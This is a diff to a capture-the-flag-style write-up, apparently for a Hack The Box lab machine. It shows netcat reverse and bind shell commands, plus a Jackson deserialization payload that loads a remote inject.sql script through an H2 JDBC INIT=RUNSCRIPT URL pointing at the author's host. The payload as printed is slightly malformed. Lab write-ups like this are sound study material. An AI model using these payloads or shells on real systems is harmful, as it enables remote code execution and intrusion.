@@ -177,7 +177,12 @@ Instead of 'id > exploited.txt' we simply execute 'nc -nv 10.10.14.8 4444', whic
 
 We can also get a bind shell by replacing the command with 'nc -nlvp 4444' and then we connect to it with *sudo nc -nv 127.0.0.1 4444*. For some reason, both those shells are unstable. However, the PoC works and we must now try to make it work against 10.10.10.214. One way to do that is by trial and error and intercepting the requests and responses with Burp.
 
+I still don't understand everything, but it looks like we have to use a part of the command *jruby test.rb "[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", {\"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost:8000/inject.sql'\"}]"* and validate it in the online tool. The PoC was made entirely locally, so we have to change the address where the script *inject.sql* is taken from. This latter becomes *http://10.10.14.8:8000/inject.sql* and we will start with the following query:
 
+```
+"["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url""jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost:8000/inject.sql'"}]"
+```
+Note that I removed all the backslashes in the query since they were probably there to escape some characters for the ruby script. I get a "Validation successful!" message when I validate it on the online tool, but nothing happens. Let's open Burp to intercept the request and response.
 
 <ins>**My thoughts**</ins>
 
